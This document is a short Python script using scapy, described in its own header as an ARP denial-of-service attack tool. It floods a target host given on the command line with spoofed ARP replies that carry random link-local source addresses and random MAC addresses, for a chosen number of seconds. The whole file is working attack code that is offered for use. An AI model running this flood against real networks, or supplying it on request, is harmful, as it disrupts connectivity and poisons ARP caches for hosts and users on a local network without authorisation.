# Program to perform arp dos attack using scapy

from scapy.all import *
from threading import Thread
import sys
import time

# Spam arp requests in each thread
def spam_arp_req(host, spam_duration):
    begin_time = time.time()
    while time.time() - begin_time < spam_duration:
        packet = ARP(op=2, pdst=host, psrc=RandIP('169.254.0.0/16'), hwsrc=RandMAC())
        print(packet.summary())
        sendp(packet, verbose=False)

# Create multiple threads for spamming from each
def spam_threads(host, no_of_threads, spam_duration):
    thread_list = list()
    try:
        for i in range(no_of_threads):
            thread = Thread(target=spam_arp_req, args=(host, spam_duration), daemon=True)
            thread_list.append(thread)
            thread.start()
        
        while any([thread.is_alive() for thread in thread_list]):
            pass

    except KeyboardInterrupt:
        pass

# Main function with 2 command line parameters
# First parameter is target
# Second parameter is spam duration(in sec)
if __name__ == '__main__':
    if len(sys.argv) < 3 or len(sys.argv) > 3:
        print("Invalid Arguments")
    else:
        host = sys.argv[1]
        spam_duration = int(sys.argv[2])
        spam_threads(host, 1, spam_duration)